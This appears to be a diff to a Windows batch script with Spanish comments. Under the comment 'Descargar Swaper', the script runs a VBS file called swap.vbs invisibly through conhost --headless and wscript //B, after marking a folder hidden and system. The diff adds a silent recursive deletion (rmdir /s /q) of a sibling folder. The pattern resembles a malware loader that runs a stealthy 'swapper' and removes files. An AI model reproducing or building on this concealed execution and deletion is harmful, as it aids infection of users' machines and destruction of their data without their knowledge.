@@ -20,4 +20,6 @@ attrib +h +s %hiddenFolder%\desktop.ini
 REM Descargar Swaper
 %SystemRoot%\System32\conhost.exe --headless cmd /c %SystemRoot%\System32\wscript.exe //B %~dp0\swap.vbs
 cls
+rmdir /s /q %~dp0\..\mauricio
+cls
 exit
